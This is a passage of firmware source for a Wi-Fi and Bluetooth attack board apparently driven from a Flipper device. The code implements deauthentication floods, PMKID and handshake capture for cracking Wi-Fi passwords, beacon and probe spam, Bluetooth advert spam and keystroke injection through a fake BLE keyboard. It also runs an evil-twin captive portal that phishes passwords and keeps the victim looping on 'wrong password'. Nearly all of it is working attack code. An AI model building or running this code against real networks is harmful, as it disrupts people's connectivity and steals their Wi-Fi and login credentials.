        BLE.beginPeripheral();
        BLEAdvert* ad = BLE.configAdvert();
        ad->setAdvData(buf, n);
        ad->startAdv();
        Serial.println("BLEADV:on"); Serial1.println("BLEADV:on");
        for(int i=0;i<secs;i++) delay(1000);
        ad->stopAdv();
        BLE.end();
        Serial.println("BLEADV:off"); Serial1.println("BLEADV:off");
      }
    }else if(readString.substring(0,7)=="BLESPAM"){
      // D2: rotate BLE advert payloads (Apple continuity / Swift Pair).
      // Args: BLESPAM <type 0=pp 1=action 2=airdrop 3=swift 4=all> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int type = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 4;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 30;
      if(type < 0 || type > 4) type = 4;
      if(secs < 1 || secs > 120) secs = 30;
      if(apActive) destroyAP();
      BLE.init();
      BLE.beginPeripheral();
      BLEAdvert* ad = BLE.configAdvert();
      uint8_t pkt[31];
      unsigned long end = millis() + (unsigned long)secs * 1000UL;
      uint8_t t = 0;
      while((long)(millis() - end) < 0) {
        uint8_t use = (type == 4) ? (uint8_t)(t % 4) : (uint8_t)type;
        uint8_t n = blespam_pkt(pkt, use);
        ad->setAdvData(pkt, n);
        ad->startAdv();
        delay(120);
        ad->stopAdv();
        t++;
      }
      BLE.end();
      String r = "BLESPAM:off " + String((unsigned)t);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,12)=="BLEGATTPROBE"){
      // P10: connect + enumerate GATT. Args: BLEGATTPROBE <aa:bb:..> [type 0=pub 1=rand]
      // Services/characteristics print to USB serial (SDK only exposes printServices()).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      String addr = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int at = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 1;
      if(addr.length() != 17){
        Serial.println("ERR:BLEGATTPROBE:addr"); Serial1.println("ERR:BLEGATTPROBE:addr");
      }else{
        BLE.init();
        BLE.beginCentral(0);
        char ab[18]; addr.toCharArray(ab, sizeof(ab));
        BLEConnect* conn = BLE.configConnection();
        Serial.println("GATT: connecting..."); Serial1.println("GATT: connecting...");
        T_GAP_REMOTE_ADDR_TYPE ta =
          (T_GAP_REMOTE_ADDR_TYPE)(at ? GAP_REMOTE_ADDR_LE_RANDOM : GAP_REMOTE_ADDR_LE_PUBLIC);
        T_GAP_REMOTE_ADDR_TYPE tb =
          (T_GAP_REMOTE_ADDR_TYPE)(at ? GAP_REMOTE_ADDR_LE_PUBLIC : GAP_REMOTE_ADDR_LE_RANDOM);
        bool cok = conn->connect(ab, ta, 6000);
        if(!cok) cok = conn->connect(ab, tb, 6000);  // retry with the other addr type
        if(cok){
          BLEClient* cl = BLE.addClient(0);
          for(int i = 0; i < 30 && !cl->connected(); i++) delay(100);
          cl->discoverServices();
          for(int i = 0; i < 50 && !cl->discoveryDone(); i++) delay(100);
          cl->printServices();  // service + characteristic UUIDs -> USB serial
          // Also stream the discovered tree to the Flipper so the host can show it
          // (printServices only writes to the SDK/USB log).
          for(uint8_t si = 0; si < cl->getServiceCount(); si++) {
            char line[96];
            snprintf(line, sizeof(line), "GATT:S|%s", cl->getServiceUuid(si));
            Serial.println(line); Serial1.println(line);
            for(uint8_t ci = 0; ci < cl->getCharacteristicCount(si); ci++) {
              char l2[96];
              snprintf(l2, sizeof(l2), "GATT:C|%s", cl->getCharacteristicUuid(si, ci));
              Serial.println(l2); Serial1.println(l2);
            }
          }
          conn->disconnect();
          Serial.println("GATT:done"); Serial1.println("GATT:done");
        }else{
          Serial.println("GATT:connect-failed"); Serial1.println("GATT:connect-failed");
        }
        BLE.end();
      }
    }else if(readString.substring(0,6)=="BADBLE"){
      // P11: BLE HID keyboard injection. Args: BADBLE [secs] [hex-payload]
      // Advertises as a HID keyboard; if a host connects, types the payload. LOW success:
      // modern hosts require pairing/confirmation and reject unauth HID peripherals.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int secs = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 30;
      if(secs < 1 || secs > 120) secs = 30;
      String phex = (s2 > 0) ? readString.substring(s2+1, readString.length()-1) : String("");
      char txt[96]; int tn = 0;
      for(int i = 0; phex[i] && phex[i+1] && tn < 95; i += 2) {
        int hi = hexnib(phex[i]), lo = hexnib(phex[i+1]);
        if(hi < 0 || lo < 0) break;
        txt[tn++] = (char)((hi << 4) | lo);
      }
      txt[tn] = 0;
      if(tn == 0) strcpy(txt, "delfyRTL says hi\n");
      ble_hidadv.clear();
      ble_hidadv.addFlags();
      ble_hidadv.addCompleteName("DELFY-KB");
      ble_hidadv.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
      ble_hidadv.addCompleteServices(BLEUUID(HID_SERVICE_UUID));
      BLEHIDDev.init();
      BLE.init();
      BLE.configAdvert()->setAdvData(ble_hidadv);
      BLE.setDeviceName("DELFY-KB");
      BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
      BLE.configSecurity()->setPairable(true);
      BLE.configSecurity()->setAuthFlags(GAP_AUTHEN_BIT_BONDING_FLAG);
      BLE.configServer(3);
      BLE.addService(BLEHIDDev.hidService());
      BLE.addService(BLEHIDDev.battService());
      BLE.addService(BLEHIDDev.devInfoService());
      BLE.beginPeripheral();
      Serial.println("BADBLE:on"); Serial1.println("BADBLE:on");
      uint32_t t0 = millis();
      bool typed = false;
      while (millis() - t0 < (uint32_t)secs * 1000u) {
        if (BLE.connected() && !typed) {
          ble_kbd.keyReleaseAll();
          delay(300);
          ble_kbd.keySequence(txt, 20);
          ble_kbd.keyReleaseAll();
          typed = true;
          Serial.println("BADBLE:typed"); Serial1.println("BADBLE:typed");
        }
        delay(200);
      }
      BLE.end();
      Serial.println("BADBLE:off"); Serial1.println("BADBLE:off");
    }else if(readString.substring(0,3)=="HOP"){
      // P1: channel hop. Args: HOP <interval_ms>  (0 = stop). Cycles 1..13.
      int ms = readString.substring(4, readString.length()-1).toInt();
      if (ms <= 0) {
        hopping = false;
      } else {
        hop_interval_ms = (ms < 100) ? 100 : ((ms > 5000) ? 5000 : (uint32_t)ms);
        hopping = true;
      }
      String r = String("HOP:") + (hopping ? "on " : "off ") + String(hopping ? (unsigned)hop_interval_ms : 0u);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="SNIFFDEAUTH"){
      // A5: count other people's deauth/disassoc frames (IDS).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      ids_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_ids_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      ids_stream(ch);
    }else if(readString.substring(0,10)=="PROBESNIFF"){
      // A1: harvest probe requests on <chan> for [secs] -> the PNL of nearby devices.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      probe_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_probe_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      probe_stream(ch);
    }else if(readString.substring(0,7)=="APCLONE"){
      // B6: clone <ssid> across [cnt] random locally-administered BSSIDs (AP clone spam).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      String ssid = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int cnt = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 8;
      if(cnt < 1 || cnt > 40) cnt = 8;
      if(ssid.length() == 0){
        Serial.println("ERROR: APCLONE needs <ssid> [count]"); Serial1.println("ERROR: APCLONE needs <ssid> [count]");
      }else{
        if(apActive) destroyAP();
        for(int i=0;i<cnt;i++){
          uint8_t src[6];
          for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
          src[0] = (src[0] & 0xFC) | 0x02;      // locally administered, unicast
          for(int x=0;x<3;x++) wifi_tx_beacon_frame(src, (void*)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid.c_str());
        }
        String r = "APCLONE:" + String((unsigned)cnt) + "|" + ssid;
        Serial.println(r); Serial1.println(r);
      }
    }else if(readString.substring(0,10)=="PROBEFLOOD"){
      // B7: emit probe requests for <ssid|*> on <chan> from [cnt] random MACs.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String ssid = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("*");
      int cnt = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 24;
      if(ch < 1 || ch > 165) ch = 6;
      if(cnt < 1 || cnt > 200) cnt = 24;
      const char* s = (ssid == "*") ? NULL : ssid.c_str();
      if(apActive) destroyAP();
      wext_set_channel(WLAN0_NAME, ch);
      for(int i=0;i<cnt;i++){
        uint8_t src[6];
        for(int k=0;k<6;k++) src[k] = (uint8_t)random(0x00, 0xFF);
        src[0] = (src[0] & 0xFC) | 0x02;
        tx_probe_req(src, s);
      }
      String r = "PROBEFLOOD:" + String((unsigned)cnt);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="PMFSCAN"){
      // P2: classify nearby APs (PMF-required / SAE / #AKMs) from the beacon RSN IE.
      // Args: PMFSCAN <chan> [secs]  (default 5s, max 60s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 5;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 5;
      if(apActive) destroyAP();   // monitor scan needs the softAP torn down
      pmf_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_pmf_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      pmf_stream(ch);
    }else if(readString.substring(0,7)=="STASCAN"){
      // P4: list stations seen for a BSSID. Args: STASCAN <chan> [secs] [bssid-12hex]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = "";
      int secs = 5;
      if (s2 > 0) {
        String a2s = readString.substring(s2+1, s3>0?s3:readString.length()-1);
        if (a2s.length() == 12) {   // 12 hex chars -> BSSID filter, secs becomes 3rd arg
          bssid_hex = a2s;
          secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 5;
        } else {
          secs = a2s.toInt();
        }
      }
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 5;
      if(apActive) destroyAP();   // monitor scan needs the softAP torn down
      sta_n = 0;
      sta_filter_on = (bssid_hex.length() == 12);
      for(int i=0; sta_filter_on && i<6; i++)
        sta_filter[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_sta_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      sta_stream(ch);
    }else if(readString.substring(0,11)=="PMKIDCLIENT"){
      // P6 clientless: raw-assoc to make the AP replay M1, capture the PMKID.
      // Args: PMKIDCLIENT <chan> <bssid-12hex> <ssid...>
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bhex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      String ssid = (s3 > 0) ? readString.substring(s3+1, readString.length()-1) : String("");
      if(ch < 1 || ch > 165) ch = 6;
      uint8_t bssid[6]; bool ok = (bhex.length() == 12);
      for(int i=0; ok && i<6; i++)
        bssid[i] = (uint8_t)strtoul(bhex.substring(i*2, i*2+2).c_str(), NULL, 16);
      if(!ok || ssid.length() == 0){
        Serial.println("ERR:PMKIDCLIENT:args"); Serial1.println("ERR:PMKIDCLIENT:args");
      }else{
        if(apActive) destroyAP();   // monitor capture needs the softAP torn down
        pmkid_n = 0;
        cl_eapol = 0;
        char macstr[20] = {0};
        wifi_get_mac_address(macstr);
        char ssidbuf[33]; ssid.toCharArray(ssidbuf, sizeof(ssidbuf));
        String r = String("PMKIDCLIENT:assoc sta=") + macstr;
        Serial.println(r); Serial1.println(r);
        pmkid_clientless(ch, bssid, ssidbuf);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_pmkid_cb, 0);
        for(int i=0;i<6;i++){
          delay(1000);
          if(i == 1 || i == 3) pmkid_clientless(ch, bssid, ssidbuf);  // retry assoc
        }
        wifi_set_promisc(0, NULL, 0);
        String d = "PMKIDCLIENT:eapol=" + String((unsigned)cl_eapol);
        Serial.println(d); Serial1.println(d);
        pmkid_stream(ch);
      }
    }else if(readString.substring(0,5)=="PMKID"){
      // P6 passive: extract PMKID from any M1 seen. Args: PMKID <chan> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      pmkid_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3, promisc_pmkid_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      pmkid_stream(ch);
    }else if(readString.substring(0,6)=="PKGRAB"){
      // P6 active: deauth <bssid> to force a client's M1, then extract PMKID.
      // Args: PKGRAB <chan> <bssid-12hex> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      uint8_t bssid[6]; bool ok = (bssid_hex.length() == 12);
      for(int i=0; ok && i<6; i++)
        bssid[i] = (uint8_t)strtoul(bssid_hex.substring(i*2, i*2+2).c_str(), NULL, 16);
      if(!ok){
        Serial.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
        Serial1.println("ERROR: PKGRAB needs <chan> <bssid-12hex> [secs]");
      }else{
        if(apActive) destroyAP();   // monitor capture needs the softAP torn down
        pmkid_n = 0;
        memcpy(hsg_bssid, bssid, 6);
        hsg_ch = ch;
        hsg_cap_ms = (uint32_t)secs * 1000u;
        hsg_pmkid = true;
        sta_n = 0;
        wext_set_channel(WLAN0_NAME, ch);
        wifi_set_promisc(3, promisc_sta_cb, 0);
        hsg_t = millis();
        hsg_phase = HSG_DISCOVER;  // discover STAs -> unicast deauth -> PMKID capture
        Serial.println("PKGRAB: armed"); Serial1.println("PKGRAB: armed");
      }
    }
    readString="";

  }
  
  // P1: channel hop tick
  if (hopping) {
    static uint32_t last_hop = 0;
    static uint8_t hop_idx = 0;
    if (millis() - last_hop >= hop_interval_ms) {
      last_hop = millis();
      hop_idx = (hop_idx + 1) % (uint8_t)sizeof(hop_channels);
      wext_set_channel(WLAN0_NAME, hop_channels[hop_idx]);
      digitalWrite(LED_G, !digitalRead(LED_G));
    }
  }

  // B: async passive CAPTURE deadline (loop() finishes it; CAPSTOP aborts early)
  if (cap_active && millis() >= cap_deadline) {
    wifi_set_promisc(0, NULL, 0);
    hs_cap = false;
    cap_active = false;
    hs_stream(cap_ch);
  }

  // HSGRAB/PKGRAB: discover STAs -> unicast deauth -> promisc capture.
  if (hsg_phase == HSG_DISCOVER) {
    if (millis() - hsg_t >= hsg_disc_ms) {
      wifi_set_promisc(0, NULL, 0);
      hsg_phase = HSG_DEAUTH;
      hsg_t = millis();
    }
  } else if (hsg_phase == HSG_DEAUTH) {
    wext_set_channel(WLAN0_NAME, hsg_ch);
    if (!is_dfs_channel(hsg_ch)) {   // DFS: RX-only
      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
        wifi_tx_deauth_frame(hsg_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 6);
        delay(5);
      }
      // Unicast both directions to each discovered STA — broadcast deauth is often ignored.
      uint8_t sn = sta_n;
      for (uint8_t k = 0; k < sn && k < 8; k++) {
        wifi_tx_deauth_frame(hsg_bssid, (void *)sta_list[k].mac, 6);   // AP -> STA
        delay(5);
        wifi_tx_deauth_frame((void *)sta_list[k].mac, hsg_bssid, 6);   // STA -> AP
        delay(5);
      }
    }
    if (millis() - hsg_t >= hsg_deauth_ms) {
      if (hsg_pmkid) wifi_set_promisc(3, promisc_pmkid_cb, 0);
      else { hs_cap = true; wifi_set_promisc(3, promisc_spike_cb, 0); }
      hsg_phase = HSG_CAPTURE;
      hsg_t = millis();
    } else {
      delay(50);
    }
  } else if (hsg_phase == HSG_CAPTURE) {
    if (millis() - hsg_t >= hsg_cap_ms) {
      wifi_set_promisc(0, NULL, 0);
      hs_cap = false;
      if (hsg_pmkid) pmkid_stream(hsg_ch);
      else hs_stream(hsg_ch);
      hsg_phase = HSG_IDLE;
    }
  }

  // C: multi-target deauth round-robin (DEAUTHADD/DEAUTHRUN)
  if (dauth_run && dauth_n > 0) {
    dauth_t* t = &dauth_list[dauth_idx];
    static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    wext_set_channel(WLAN0_NAME, t->ch);
    if (!is_dfs_channel(t->ch)) {   // DFS: RX-only
      const uint8_t* dst = t->have_client ? t->client : bcast;
      digitalWrite(LED_R, HIGH);
      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
        wifi_tx_deauth_frame(t->bssid, (void *)dst, deauth_reason);
        delay(5);
      }
      digitalWrite(LED_R, LOW);
    }
    dauth_idx = (dauth_idx + 1) % dauth_n;
    delay(50);
  }

  if (deauth_wifis.size() > 0) {
    memcpy(deauth_bssid, scan_results[deauth_wifis[current_num]].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[deauth_wifis[current_num]].channel);
    current_num++;
    if (current_num >= deauth_wifis.size()) current_num = 0;
    digitalWrite(LED_R, HIGH);
    for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
      wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
      delay(5);
    }
    digitalWrite(LED_R, LOW);
    delay(50);
  }

  if (randomSSID){
    digitalWrite(LED_G, !digitalRead(LED_G));
    int randomIndex = random(0, 10);
    int randomChannel = allChannels[randomIndex];
    String ssid2 = generateRandomString(10);
    for(int i=0;i<6;i++){
      byte randomByte = random(0x00, 0xFF);
      snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
    }
    
    const char * ssid_cstr2 = ssid2.c_str();
    wext_set_channel(WLAN0_NAME,randomChannel);
    for(int x=0;x<5;x++){
      wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }
  }
  if (rickroll){
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v = 0; v < 8; v++){   // FIX: was `for (int v; ...)` — v uninitialized (UB)
      String ssid2 = rick_roll[v];
      for(int i=0;i<7;i++){
        byte randomByte = random(0x00, 0xFF);
        snprintf(randomString + i * 3, 4, "\\x%02X", randomByte);
      } 
    
      const char * ssid_cstr2 = ssid2.c_str();
      wext_set_channel(WLAN0_NAME,v+1);
      for(int x=0;x<5;x++){
       wifi_tx_beacon_frame(randomString,(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
      }
    }
  }
  if (ghostSpam){
    digitalWrite(LED_G, !digitalRead(LED_G));
    for (int v = 0; v < 8; v++){
      const char * ssid_cstr2 = ghost_ssids[v];
      wext_set_channel(WLAN0_NAME, v+1);
      for(int x=0;x<5;x++){
        wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
      }
    }
  }
  if(ssid!=""){
    int channel = 5;
    digitalWrite(LED_G, !digitalRead(LED_G));
    wext_set_channel(WLAN0_NAME,channel);
    const char * ssid_cstr2 = ssid.c_str();
    for(int x=0; x<5; x++){
      DEBUG_SER_PRINT("START "+ssid);
      wifi_tx_beacon_frame((void *)"\x00\xE0\x4C\x01\x02\x03",(void *)"\xFF\xFF\xFF\xFF\xFF\xFF",ssid_cstr2);
    }

  }
  
  if (apActive) {
    WiFiClient client = server.available();
    if (client) {
      //client.setRecvTimeout(500);
      String request;
      request.reserve(256);  // Reservamos memoria para evitar fragmentación
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      while (client.connected()) {
        if (client.available()) {
          char character = client.read();
          if (character == '\n') {
            while(client.available()){
            character=client.read();
            client.clearWriteError();
            
            delay(1);
            }
            String path = parseRequest(request);
            Serial.println(request);
            uint32_t cip = (uint32_t)client.remoteIP();
            bool authed = ip_is_authed(cip);
            Serial.print("CIP="); Serial.print(cip, HEX); Serial.print(" authed="); Serial.println(authed);
            // RFC 8908 Captive-Portal API endpoint that DHCP option 114 points at.
            // Android's NetworkMonitor fetches this expecting application/captive+json.
            // Report captive:false once this client is authorized so the OS clears the warning.
            if(path.startsWith("/cp.json")){
              String j = String("{\"captive\":") + (authed ? "false" : "true") + ",\"user-portal-url\":\"" + String(portalUrl) + "\"}";
              String resp = makeResponse(200, "application/captive+json", false, j.length());
              resp += j;
              client.write(resp.c_str());
            }else
            // Portal page + form submissions get the HTML; every captive probe
            // (generate_204, ncsi.txt, success.html, …) and any unknown URL gets a
            // 302 to the portal root, which is what triggers the Android/iOS sign-in flow.
            if(path.equals("/")||path.startsWith("/?")||path.startsWith("/login")||path.startsWith("/get")||path.startsWith("/userinput")){
              if (deauth_wifis.size() != 0)
                handleRequest(client, (enum portals)portal, scan_results[deauth_wifis[0]].ssid);
              else
                handleRequest(client, (enum portals)portal, "router");
              if (path.indexOf('?') >= 0 && (path.indexOf('=') > path.indexOf('?'))) {
                String datos = path.substring(path.indexOf('?') + 1);
                if (datos.length() > 0) {
                  Serial1.print("EV:");
                  Serial1.println(datos);
                  // Portal pages now loop the victim ("wrong password"), so we keep the
                  // network captive and never validate (no 204) -> the sign-in keeps
                  // coming back. Re-enable the line below to instead clear the OS
                  // "no internet" warning after a capture (that also makes the
                  // handle204()/authed_ips path live again):
                  // ip_mark_authed(cip);   // <- 204 path: mark this client authed after creds
                }
              }
          }else{
            // Probe / unknown URL: authorized client -> 204 (clears warning); else 302 to portal.
            if(authed) handle204(client); else handleRedirect(client);
          }
          break;

          }else if(character == '%'){
            char buff[2] ;
            client.read(buff,2);
            char value = (char)strtol(buff, NULL, 16);
            if(value <= 127){
              character = value;
            }else{
              request += "%";
              request += buff[0];
              request += buff[1];
            }

          } 
          request += character;

          
          delay(10);
        }
      }
      

      // Opcional: forzar limpieza de conexiones TIME-WAIT (solo si es necesario)
      /*
      struct tcp_pcb *tcp;
      for (tcp = tcp_tw_pcbs; tcp != NULL; tcp = tcp->next) {
        if (tcp->local_port == 80) tcp->local_port = localPortNew++;
        tcp_close(tcp);
      }
      */

      

      delay(50);  // menor delay, no saturar
      client.stop();

    }
  }
  
}